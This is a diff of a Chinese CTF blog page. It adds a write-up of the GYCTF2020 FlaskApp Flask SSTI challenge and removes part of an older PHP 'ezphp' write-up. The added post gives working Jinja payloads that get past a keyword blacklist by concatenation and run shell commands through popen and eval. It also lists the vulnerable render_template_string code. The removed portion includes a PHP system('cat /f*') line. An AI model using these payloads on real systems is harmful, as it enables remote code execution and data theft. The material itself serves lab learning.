@@ -3910,6 +3910,229 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-01 00:00:00+00:00">2026-11-01</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/python/" class="md-meta__link">Python</a>, 
+              <a href="category/flask/" class="md-meta__link">Flask</a>, 
+              <a href="category/ssti/" class="md-meta__link">SSTI</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="gyctf2020-flaskapp"><a class="toclink" href="gyctf2020-flaskapp-ssti/">[GYCTF2020] FlaskApp — 一张黑名单，两条链</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — Flask SSTI（有过滤）</p>
+<p><strong>题目地址</strong>：BUUCTF / ctf2 复刻环境</p>
+<p><strong>Flag</strong>：<code>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_1">题目概述</a></h3>
+<p>进入靶场发现是一个加解密的方式，先随便加密解密试试。</p>
+<p>这里发现，<strong>解密时会把解密的内容打印出来</strong>——那就有戏了。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_2">解题过程</a></h3>
+<h4 id="step-177-nonono"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-177-nonono">Step 1：<code>{{7*7}}</code> 返回 <code>nonono</code></a></h4>
+<p>先试一下 <code>{{7*7}}</code>，返回的是 <code>nonono</code>。</p>
+<p><strong>这个 <code>nonono</code> 就明确了我们的思路是对的，只不过有东西被过滤了。</strong></p>
+<p>接着我去试，发现被过滤的有这些：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>*  eval  os  subprocess  popen  import  system  request  flag
+</span></code></pre></div>
+<p><strong>（是子串匹配、不分大小写。所以 <code>host</code> 这种词也会中招 —— 里面含 <code>os</code>。）</strong></p>
+<p><strong>能过的是：</strong><code>config</code> <code>self</code> <code>session</code> <code>url_for</code> <code>lipsum</code> <code>globals</code> <code>builtins</code> <code>class</code> <code>open</code> <code>cat</code> <code>read</code> <code>+</code></p>
+<p><strong>注意 <code>+</code> 没被过滤</strong>，所以后面全靠拼接绕过。</p>
+<h4 id="step-2-flask"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-2-flask">Step 2：确认是 Flask，先试短路</a></h4>
+<p>试试 <code>{{config}}</code>，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。</p>
+<p>那先试试 <code>url_for</code> 能不能正常使用，结论是可行的：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
+</span></code></pre></div>
+<h4 id="step-3-net"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-3-net">Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向</a></h4>
+<p>接着再试 <code>{{url_for.__globals__}}</code>，<strong>但是页面没有回显</strong>，看了一下 Net 发现被重定向了。</p>
+<p><strong>这里我实在不明白原因。</strong>BP 抓包抓下来的响应里，session 里有一大串数据，但是解码不出来。</p>
+<blockquote>
+<p><strong>后来搞明白了，记在这里：</strong></p>
+<p>这题用的是 <strong>POST-Redirect-GET</strong> 模式：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">():</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'GET'</span><span class="p">:</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'res'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'decode.html'</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="p">)</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'res'</span><span class="p">]</span> <span class="o">=</span> <span class="n">res</span>          <span class="c1"># 结果塞进 session（flash）</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">)</span>    <span class="c1"># 302</span>
+</span></code></pre></div>
+<p><strong>所以：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>③ 结果越长，cookie 越大
+</span></code></pre></div>
+<p><strong>我看到的"没回显"，其实是在看 302 的响应体（内容是 <code>Redirecting...</code>）。</strong>跟过滤无关，是流程问题。</p>
+</blockquote>
+<h4 id="step-4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-4">Step 4：短路打通</a></h4>
+<p><code>url_for.__globals__</code> 本身是通的，卡住的是<strong>再往下取 <code>['os']</code></strong> —— 因为 <code>os</code> 在名单里。</p>
+<p><strong>但 <code>+</code> 没被过滤，所以可以拼：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{{url_for.__globals__['o'+'s']}}
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>→  &lt;module 'os' from '/usr/local/lib/python3.7/os.py'&gt;
+</span></code></pre></div>
+<p>这个又能正常回显了。</p>
+<h4 id="step-5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-5">Step 5：先找文件名</a></h4>
+<p><code>popen</code> 被拦，所以也拼一下；然后<strong>先 <code>ls /</code></strong>，因为我们还不知道 flag 叫什么：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
+</span></code></pre></div>
+<p><strong>根目录下有个 <code>this_is_the_flag.txt</code>。文件名是这一步才知道的。</strong></p>
+<h4 id="step-6"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-6">Step 6：读出来</a></h4>
+<p>注意 <code>flag</code> 这个词也被拦，所以路径也要拼（<code>'this_is_the_fl'</code> + <code>'ag.txt'</code>）：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
+</span></code></pre></div>
+<h4 id="step-7"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-7">Step 7：换一条路（长链）</a></h4>
+<p>短路能通，是因为 Flask 注入了 <code>url_for</code>。<strong>换个环境把 <code>url_for</code> 删了，这条路就断。</strong>所以再走一遍长链——从字面量 <code>''</code> 开始爬。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>→  &lt;class '_py_warnings.catch_warnings'&gt;
+</span></code></pre></div>
+<p><strong>（<code>__name__</code> 是四个下划线；<code>name</code> 不出东西。另外 <code>equalto</code> 要加引号，不加会报 <code>no test named Undefined</code>。）</strong></p>
+<p>然后接 <code>['__init__']['__globals__']['__builtins__']</code>，拿到 builtins 的 dict。</p>
+<p><strong>接下来我一开始想用 <code>eval</code>，直接给出去的版本报了 <code>nonono</code>，我不知道是哪个还被过滤了。</strong></p>
+<blockquote>
+<p><strong>答案：是 <code>"os"</code>。</strong></p>
+<p>我把 <code>import</code> 拆了、<code>popen</code> 拆了、<code>eval</code> 拆了，<strong>唯独把 <code>"os"</code> 原样写在了字符串里</strong> —— 那两个字面量照样会被匹配。</p>
+<p>拆开之后：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
+</span></code></pre></div>
+</blockquote>
+<p><strong>完整的一条：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
+</span></code></pre></div>
+<p><strong>也是先 <code>ls /</code> 再 <code>cat</code>，一样拿不到名字就没法读。</strong></p>
+<hr />
+<h3 id="_3"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>加解密功能 → 解密的结果被当模板渲染
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  → {{7*7}} 回 nonono → 有黑名单，但思路对
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    → {{config}} 确认 Flask
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      → url_for 能用 → 短路：url_for.__globals__
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>          → ls / 找到 this_is_the_flag.txt
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>            → cat 它（flag 也被拦，路径也拼）→ flag
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>              → 再走一遍长链验证：'' → subclasses → catch_warnings
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>                → __builtins__ → eval（import/os/popen 全要拆）→ flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_4">漏洞原理</a></h4>
+<p><strong>① 解密结果被当成模板源码</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p><strong>base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。</strong></p>
+<p><strong>② 黑名单是"词"，绕过靠"拼接"</strong></p>
+<p>过滤器查的是<strong>你原文里有没有那串字母</strong>；Jinja 求值时会把 <code>+</code> 算掉，得到完整字符串。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>原文：'o'+'s'      → 不含 os
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>求值：'os'          → 才是真正的属性名
+</span></code></pre></div>
+<p><strong>过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。</strong></p>
+<p><strong>③ 长链和短链的区别只在入口</strong></p>
+<p>短链从<strong>框架注入的名字</strong>（<code>url_for</code>）出发，长链从<strong>字面量</strong>（<code>''</code>）出发。终点一样，都是拿到 <code>__builtins__</code>。</p>
+<h4 id="_5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>黑名单（本题）</td>
+<td><code>*</code> <code>eval</code> <code>os</code> <code>popen</code> <code>system</code> <code>import</code> <code>request</code> <code>subprocess</code> <code>flag</code>，子串匹配</td>
+</tr>
+<tr>
+<td><code>+</code> 拼接</td>
+<td><code>'o'+'s'</code> 绕 <code>os</code>；<code>'this_is_the_fl'+'ag.txt'</code> 绕 <code>flag</code></td>
+</tr>
+<tr>
+<td>子串陷阱</td>
+<td><code>host</code> 里含 <code>os</code> 也会被拦——拆词时每一段都要检查</td>
+</tr>
+<tr>
+<td>POST-Redirect-GET</td>
+<td>结果存 session，302 的响应体里没有结果</td>
+</tr>
+<tr>
+<td>结果越长 cookie 越大</td>
+<td>因为结果被塞进了 session</td>
+</tr>
+<tr>
+<td><code>\|selectattr</code></td>
+<td>按属性名筛，代替"数下标"跨环境稳定</td>
+</tr>
+<tr>
+<td><code>'__name__'</code> vs <code>'name'</code></td>
+<td>前者才有值，后者筛不出东西</td>
+</tr>
+<tr>
+<td><code>'equalto'</code> 要加引号</td>
+<td>不加时报 <code>no test named Undefined</code></td>
+</tr>
+<tr>
+<td>双层拆分</td>
+<td><code>eval</code> 那条：Jinja 层拆一次，Python 源码再拆一次</td>
+</tr>
+<tr>
+<td><code>open</code> vs <code>eval</code></td>
+<td><code>open</code> 只读文件，不碰 shell，名单里也没它——比 <code>eval</code> 省事</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>两条链的完整 payload（实测）</summary>
+<p><strong>短路（<code>url_for</code>）</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'ls /'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>长链（<code>subclasses</code> + <code>eval</code>，双层拆分）</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("ls /").read()'</span><span class="o">)</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>长链（<code>subclasses</code> + <code>open</code>，只有一层拆分，更省事）</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'/this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>注意：<code>open</code> 版必须先知道文件名（靠 <code>ls /</code>），而且不能执行命令，只能读文件。</strong></p>
+</details>
+<hr />
+<details class="note">
+<summary>两道黑名单自查（我踩过的）</summary>
+<p><strong>① 以为 <code>url_for.__globals__</code> 被拦了</strong></p>
+<p>其实是 302 重定向，响应体里本来就没有结果。<strong>先分清"没执行"和"结果在下一页"。</strong></p>
+<p><strong>② <code>eval</code> 那条报 <code>nonono</code>，找不到是哪个词</strong></p>
+<p><strong>逐个测试是最快的办法</strong>：把可疑的词单独包成 <code>{{'xxx'}}</code> 发一遍，看哪个返回 <code>nonono</code>。</p>
+<p>我拆了 <code>import</code>、<code>popen</code>、<code>eval</code>，就是没拆 <code>"os"</code>。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-31 00:00:00+00:00">2026-10-31</time></li>
         
           <li class="md-meta__item">
@@ -5513,358 +5736,6 @@
 </span><span id="__span-20-54"><a id="__codelineno-20-54" name="__codelineno-20-54" href="#__codelineno-20-54"></a>
 </span><span id="__span-20-55"><a id="__codelineno-20-55" name="__codelineno-20-55" href="#__codelineno-20-55"></a><span class="c1">// 输出文档内容</span>
 </span><span id="__span-20-56"><a id="__codelineno-20-56" name="__codelineno-20-56" href="#__codelineno-20-56"></a><span class="k">include</span><span class="p">(</span><span class="nv">$target</span><span class="p">);</span>
-</span></code></pre></div>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/php/" class="md-meta__link">PHP</a>, 
-              <a href="category/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-meta__link">弱类型</a>, 
-              <a href="category/%E6%B5%81%E5%8C%85%E8%A3%85%E5%99%A8/" class="md-meta__link">流包装器</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 4 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="ezphp"><a class="toclink" href="ezphp-two-levels/">ezphp — 值与位置的错位，写入通道与过滤器的错位</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — PHP 进制解析绕过 + 流包装器写入绕过</p>
-<p><strong>题目地址</strong>：ctfplus 平台实例（已关闭）</p>
-<p><strong>Flag</strong>：<code>SYC{Y0u_have_alr3ady_g0tten_started_w1th_PHP}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="ezphp-two-levels/#_1">题目概述</a></h3>
-<p>两道关，一关传参数，一关写文件。</p>
-<p><strong>第一关（<code>index.php</code>）</strong>：一个 <code>num</code> 参数，四道检查，全过才给你 <code>$_SESSION['ezphp_level1']</code> 并跳到 <code>death.php</code>。</p>
-<p><strong>第二关（<code>death.php</code>）</strong>：要有第一关的 session，然后接收 <code>filename</code> 和 <code>content</code>，往文件里写：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$written = @file_put_contents(</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">    $filename,</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">    "</span><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">" . $content</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">);</span>
-</span></code></pre></div>
-<p><strong>两关的共同点：都在利用“同一段数据被两个东西读出两种含义”。</strong></p>
-<hr />
-<h3 id="_2"><a class="toclink" href="ezphp-two-levels/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="ezphp-two-levels/#step-1">Step 1：第一关，先看四道检查在拦什么</a></h4>
-<p>首先进行代码审计：</p>
-<table>
-<thead>
-<tr>
-<th>检查</th>
-<th>拦的是</th>
-<th>你要满足</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>!is_string($num)</code></td>
-<td>数组</td>
-<td>传字符串</td>
-</tr>
-<tr>
-<td><code>$num == 411413</code></td>
-<td>直接输入答案</td>
-<td>不能弱等于 411413</td>
-</tr>
-<tr>
-<td><code>preg_match("/[a-z\.]/i")</code></td>
-<td><strong>所有字母</strong> + 点</td>
-<td>不能有 <code>e</code>、<code>x</code>、<code>b</code></td>
-</tr>
-<tr>
-<td><code>!strpos($num,"0")</code></td>
-<td><code>0</code> 在<strong>第 0 位</strong></td>
-<td><code>0</code> 必须在后面</td>
-</tr>
-<tr>
-<td><code>intval($num,0) === 411413</code></td>
-<td>——</td>
-<td>解析后必须等于 411413</td>
-</tr>
-</tbody>
-</table>
-<h4 id="step-2"><a class="toclink" href="ezphp-two-levels/#step-2">Step 2：确定只剩八进制</a></h4>
-<p><code>intval($num, 0)</code> 第二个参数为 0，那么就看 <code>num</code> 的开头：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>0x 开头  →  16 进制     ✗ 字母 x 被 [a-z] 拦了
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>0b 开头  →  2 进制      ✗ 字母 b 被拦了
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>0 开头   →  8 进制      ✓ 纯数字，只剩这条
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>其他     →  10 进制     ✗ 十进制真值会等于 411413，被第一道 `==` 拦
-</span></code></pre></div>
-<p><strong>所以这里只能用 8 进制。</strong></p>
-<h4 id="step-3-0"><a class="toclink" href="ezphp-two-levels/#step-3-0">Step 3：但 <code>0</code> 不能是第一个 —— 用换行符</a></h4>
-<p>八进制必须以 <code>0</code> 开头，可 <code>strpos</code> 那道又不许 <code>0</code> 在第 0 位。</p>
-<p><strong>关键在于：<code>intval</code> 会跳过前导空白，而 <code>strpos</code> 不会跳过任何东西 —— 它只是找下标。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>strpos("01443425","0")  = 0   → !0 = true  → 死
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>strpos("\n01443425","0") = 1  → !1 = false → 活
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>intval("\n01443425", 0)  = 411413          → 值对
-</span></code></pre></div>
-<p><strong>所以选择用 <code>%0A</code>（换行符）当第一个就可以了。</strong></p>
-<h4 id="step-4"><a class="toclink" href="ezphp-two-levels/#step-4">Step 4：算数字</a></h4>
-<p><strong>别手算，用 PHP 算：</strong></p>
-<p><img alt="用 base_convert 算八进制" src="../assets/images/ezphp-two-levels/01-octal-calc.png" /></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">php</span> <span class="n">-r</span> <span class="s2">"echo base_convert('411413', 10, 8);"</span>
-</span></code></pre></div>
-<p>得到 <code>1443425</code>，前面补 <code>0</code> 就是 <code>01443425</code>。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>payload：?num=%0A01443425
-</span></code></pre></div>
-<p><strong>⚠️ 数字必须完整。</strong> 少一位（比如写成 <code>0144325</code>）<code>intval</code> 会得到 <code>51413</code>，差得非常远。</p>
-<h4 id="step-5php-exit"><a class="toclink" href="ezphp-two-levels/#step-5php-exit">Step 5：第二关，<code>&lt;?php exit;?&gt;</code> 是“前缀死刑”</a></h4>
-<p>进来之后源码就很明晰了：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">$written = @file_put_contents(</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">    $filename,</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">    "</span><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">" . $content</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">);</span>
-</span></code></pre></div>
-<p><strong>写出来的文件是这样的：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">&lt;?php</span> <span class="k">exit</span><span class="p">;</span><span class="cp">?&gt;&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat /f*'</span><span class="p">);</span><span class="cp">?&gt;</span>
-</span></code></pre></div>
-<p><strong><code>exit;</code> 会在你的代码之前执行，整个请求立刻结束 —— 后面那段永远到不了。</strong></p>
-<p><strong>它不删你的代码，只是让你的代码排不上队。</strong></p>
